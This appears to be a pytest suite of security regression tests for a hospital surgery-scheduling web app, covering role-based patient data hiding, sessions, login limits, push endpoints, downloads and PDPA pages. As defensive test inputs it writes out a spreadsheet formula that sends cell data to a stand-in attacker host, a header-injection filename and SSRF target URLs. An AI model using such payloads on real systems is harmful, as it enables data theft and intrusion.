"""Fixes from the security review: patient data per role, sessions and logins, push and LINE,
downloads and uploads, response headers, and the PDPA endpoints.

Most run in demo mode through the API; the bed test needs PostgreSQL (TEST_DATABASE_URL).
"""
from __future__ import annotations

import io
import json

import pytest
from fastapi.testclient import TestClient

from app import auth, hospital_io
from app.auth import LoginLimiter, Signer, env_admin
from app.main import access, app, store
from app.notify import MemoryNotifyStore, Notifier, WebPushSender, push_endpoint_ok
from app.store import StoreError
from test_app import OWNER, _case, fresh, make_user, owner, session  # noqa: F401  (fixtures)
from test_db import ADMIN_URL, db_url  # noqa: F401  (fixtures)
from test_db import store as db_store  # noqa: F401

needs_db = pytest.mark.skipif(not ADMIN_URL, reason="set TEST_DATABASE_URL to run database tests")


# ------------------------------------------------------------ patient data per role

def test_cssd_sees_no_typed_notes_or_change_notices(owner):
    pending = owner.post("/api/overrun", json={"case_id": "C04", "new_duration_mins": 400, "now": "08:30"})
    assert pending.status_code == 200, pending.text
    waiting = owner.get("/api/state").json()["pending"]
    assert waiting, "the overrun should push a case to the waiting list"
    note = "นายสมชาย ใจดี HN 445566 K 2.9"
    r = owner.post(f"/api/pending/{waiting[0]['id']}/cancel", json={"reason": "OTHER", "note": note})
    assert r.status_code == 200, r.text
    assert note in json.dumps(owner.get("/api/state").json(), ensure_ascii=False)  # the scheduler still sees it
    cssd = make_user(owner, "cssd1", "cssd")
    seen = json.dumps(cssd.get("/api/state").json(), ensure_ascii=False)
    assert note not in seen and "HN-0004" not in seen and "(HN " not in seen


def test_a_surgeon_cannot_rebook_another_surgeons_waiting_request(owner):
    owner.post("/api/overrun", json={"case_id": "C04", "new_duration_mins": 400, "now": "08:30"})
    waiting = owner.get("/api/state").json()["pending"][0]
    other = "SUR-GEN" if waiting["surgeon_id"] != "SUR-GEN" else "SUR-URO"
    surgeon = make_user(owner, "surg9", "surgeon", other)
    body = {"case": _case(surgeon_id=other, pending_id=waiting["id"], patient_hn="HN-X"), "start": "15:00"}
    assert surgeon.post("/api/bookings", json=body).status_code == 403
    assert waiting["id"] in [p["id"] for p in owner.get("/api/state").json()["pending"]]


# ------------------------------------------------------------ logins and sessions

def test_logout_ends_the_session_on_the_server(owner):
    cookie = owner.cookies.get("orchestra_session")
    assert owner.post("/api/logout", json={}).status_code == 200
    replay = TestClient(app, base_url="https://testserver", cookies={"orchestra_session": cookie})
    assert replay.get("/api/me").status_code == 401  # a copied cookie no longer works
    nurse = make_user(session(*OWNER), "nurse7", "staff", "SCR-2")
    copied = nurse.cookies.get("orchestra_session")
    nurse.post("/api/logout", json={})
    replay = TestClient(app, base_url="https://testserver", cookies={"orchestra_session": copied})
    assert replay.get("/api/me").status_code == 401


def test_guessing_from_many_addresses_is_still_limited():
    c = TestClient(app, base_url="https://testserver")
    for i in range(20):
        r = c.post("/api/login", json={"username": OWNER[0], "password": f"wrong-{i}"},
                   headers={"X-Forwarded-For": f"10.0.{i}.1"})
        assert r.status_code == 401
    r = c.post("/api/login", json={"username": OWNER[0], "password": OWNER[1]}, headers={"X-Forwarded-For": "10.9.9.9"})
    assert r.status_code == 429  # 20 misses for one name from anywhere: wait 10 minutes


def test_limiter_counts_per_name_and_forgets():
    limiter = LoginLimiter(limit=5, window_s=600, per_user=3)
    for ip in ("a", "b", "c"):
        assert not limiter.blocked(("u", ip))
        limiter.fail(("u", ip))
    assert limiter.blocked(("u", "d")) and not limiter.blocked(("v", "a"))


def test_every_login_path_costs_one_password_check(monkeypatch):
    calls = []
    real = auth.verify_password
    monkeypatch.setattr(auth, "verify_password", lambda p, h: calls.append(h) or real(p, h))
    c = TestClient(app, base_url="https://testserver")
    owner = session(*OWNER)
    make_user(owner, "nurse8", "staff", "SCR-3")
    off = next(u for u in owner.get("/api/users").json()["users"] if u["username"] == "nurse8")
    for username in ("nobody-here", "nurse8", OWNER[0]):
        calls.clear()
        c.post("/api/login", json={"username": username, "password": "wrong-password-1"})
        assert len(calls) == 1, username  # same work whether or not the name exists
    owner.patch(f"/api/users/{off['user_id']}", json={"is_active": False})
    calls.clear()
    c.post("/api/login", json={"username": "nurse8", "password": "wrong-password-1"})
    assert len(calls) == 1


def test_session_key_and_owner_version_do_not_reveal_the_password(monkeypatch):
    import hashlib

    monkeypatch.delenv("SESSION_SECRET", raising=False)
    monkeypatch.setenv("APP_PASSWORD", "guessable-pass")
    monkeypatch.delenv("DATABASE_URL", raising=False)
    weak = hashlib.sha256(b"orchestra-session|guessable-pass|").digest()
    assert Signer.from_env().secret != weak and len(Signer.from_env().secret) == 32
    assert env_admin().session_version != int(hashlib.sha256(b"guessable-pass").hexdigest()[:6], 16)
    assert env_admin().session_version == env_admin().session_version  # stable


# ------------------------------------------------------------ push and LINE

def test_push_goes_only_to_browser_push_services():
    for bad in ("https://127.0.0.1:5432/x", "http://fcm.googleapis.com/fcm/send/a", "https://evil.example/fcm.googleapis.com",
                "https://fcm.googleapis.com.evil.example/a", "https://user:pw@fcm.googleapis.com/a",
                "https://fcm.googleapis.com:8443/a", "https://169.254.169.254/latest"):
        assert not push_endpoint_ok(bad), bad
    for good in ("https://fcm.googleapis.com/fcm/send/abc", "https://updates.push.services.mozilla.com/wpush/v2/x",
                 "https://web.push.apple.com/QH", "https://wns2-par02p.notify.windows.com/w/?token=x"):
        assert push_endpoint_ok(good), good
    sender = WebPushSender(MemoryNotifyStore(), "mailto:ops@example.org")
    from app.notify import Target
    assert sender.send(Target("u", "webpush", "https://10.0.0.5/push", {"p256dh": "x", "auth": "y"}), {})[0] == "removed"


def test_push_devices_are_capped():
    from test_notify import USERS, notifier

    n = notifier()
    for i in range(10):
        n.subscribe(USERS[1], {"endpoint": f"https://fcm.googleapis.com/fcm/send/{i}", "keys": {"p256dh": "p", "auth": "a"}},
                    None)
    with pytest.raises(ValueError, match="10"):
        n.subscribe(USERS[1], {"endpoint": "https://fcm.googleapis.com/fcm/send/x", "keys": {"p256dh": "p", "auth": "a"}},
                    None)
    with pytest.raises(ValueError):
        n.subscribe(USERS[2], {"endpoint": "https://127.0.0.1/x", "keys": {"p256dh": "p", "auth": "a"}}, None)


def test_line_link_codes_cannot_be_guessed():
    from test_notify import USERS, FakeLine, notifier, sign

    line = FakeLine()
    n = notifier(line=line)
    code = n.link_code(USERS[1])
    msg = lambda text: json.dumps({"events": [{"type": "message", "replyToken": "r", "source": {"userId": "UBAD"},  # noqa: E731
                                                "message": {"type": "text", "text": text}}]}).encode()
    for guess in range(5):
        wrong = f"{(int(code) + guess + 1) % 1000000:06d}"
        assert n.line_webhook(msg(wrong), sign(msg(wrong))) == 0
    assert n.line_webhook(msg(code), sign(msg(code))) == 0  # even the right code: wait 15 minutes
    assert "รอ 15 นาที" in line.posts[-1][1]["messages"][0]["text"]
    assert not n.status(USERS[1])["line"]["linked"]


# ------------------------------------------------------------ downloads and uploads

def test_csv_and_excel_downloads_keep_formulas_as_text(owner):
    evil = '=HYPERLINK("https://evil.example/?d="&A1,"x")'
    assert hospital_io.csv_safe(evil) == "'" + evil
    assert hospital_io.csv_safe("-15") == "-15" and hospital_io.csv_safe(-15) == -15 and hospital_io.csv_safe("ok") == "ok"
    assert hospital_io.list_formula(['ช', 'a"b', "x,y"]) == '"ช,a""b"'
    from openpyxl import Workbook, load_workbook

    wb = Workbook()
    wb.active.append(["note", evil, "=1+1"])
    hospital_io.as_text(wb)
    out = io.BytesIO()
    wb.save(out)
    raw = load_workbook(io.BytesIO(out.getvalue()))
    assert [c.data_type for c in raw.active[1]] == ["s", "s", "s"] and raw.active["B1"].value == evil

    r = owner.post("/api/bookings", json={"case": _case(procedure=evil, patient_hn="HN-F1"), "start": "16:00"})
    assert r.status_code == 200, r.text
    text = owner.get("/api/reports/cases.csv").text
    assert evil not in text.replace("'" + evil.replace('"', '""'), "")  # only the neutralised form appears
    name = owner.get('/api/reports/cases.csv?date_from=x";filename="evil.html').headers["content-disposition"]
    assert "evil.html" not in name


def test_uploads_are_bounded():
    from openpyxl import Workbook

    wb = Workbook()
    for i in range(hospital_io.MAX_SHEETS + 1):
        wb.create_sheet(f"S{i}")
    out = io.BytesIO()
    wb.save(out)
    with pytest.raises(StoreError, match="แผ่นงาน"):
        hospital_io._xlsx_grids(out.getvalue())
    wide = Workbook()
    wide.active.cell(1, 2000, "far")  # a column far to the right is not read
    out = io.BytesIO()
    wide.save(out)
    [(_, rows)] = hospital_io._xlsx_grids(out.getvalue())
    assert len(rows[0]) == 60
    with pytest.raises(StoreError, match="CSV"):
        hospital_io._csv_grid(("a,b\n" + "x" * 200_000 + ",y\n").encode())


def test_security_headers_and_size_limit(owner):
    r = owner.get("/")
    assert "frame-ancestors 'none'" in r.headers["content-security-policy"]
    assert "fonts.googleapis.com" in r.headers["content-security-policy"]
    assert r.headers["strict-transport-security"].startswith("max-age=")
    assert "microphone=(self)" in r.headers["permissions-policy"]
    assert "content-security-policy" not in owner.get("/api/docs").headers  # Swagger UI uses a CDN
    big = owner.post("/api/intake/parse", content=b"{}", headers={"Content-Type": "application/json",
                                                                 "Content-Length": str(20 * 1024 * 1024)})
    assert big.status_code == 413


# ------------------------------------------------------------ PDPA endpoints

def test_privacy_pages_are_for_admins_and_views_are_logged(owner):
    access._memory.clear()
    access._recent.clear()
    owner.get("/api/state")
    entries = owner.get("/api/privacy/access").json()["entries"]
    assert [(e["action"], e["username"]) for e in entries] == [("schedule", OWNER[0])]
    cssd = make_user(owner, "cssd2", "cssd")
    cssd.get("/api/state")  # no patient identity shown: nothing to log
    assert len(owner.get("/api/privacy/access").json()["entries"]) == 1
    scheduler = make_user(owner, "sched2", "scheduler")
    for path in ("/api/privacy/access", "/api/privacy/retention"):
        assert scheduler.get(path).status_code == 403
    assert scheduler.post("/api/privacy/apply", json={"confirm": True}).status_code == 403
    assert owner.post("/api/privacy/retention", json={"patient_days": 7}).status_code == 422  # at least 30 days
    assert owner.get("/api/state?view=other").status_code == 422
    assert owner.get("/privacy").status_code == 200


@needs_db
def test_schedulers_open_and_close_beds_but_do_not_change_their_type(db_store):  # noqa: F811
    from app.admin_store import Inventory

    admin = Inventory(db_store)
    bed = admin.beds()["beds"][0]
    other = "ICU_SURGICAL" if bed["type"] != "ICU_SURGICAL" else "PACU"
    admin.save_bed({"type": other, "status": "CLOSED"}, code=bed["code"], keep_type=True)
    after = next(b for b in admin.beds()["beds"] if b["code"] == bed["code"])
    assert (after["type"], after["status"]) == (bed["type"], "CLOSED")
    admin.save_bed({"type": other, "status": "AVAILABLE"}, code=bed["code"])  # admins may
    assert next(b for b in admin.beds()["beds"] if b["code"] == bed["code"])["type"] == other


def test_store_is_demo():
    assert store.mode == "demo" and isinstance(Notifier, type)
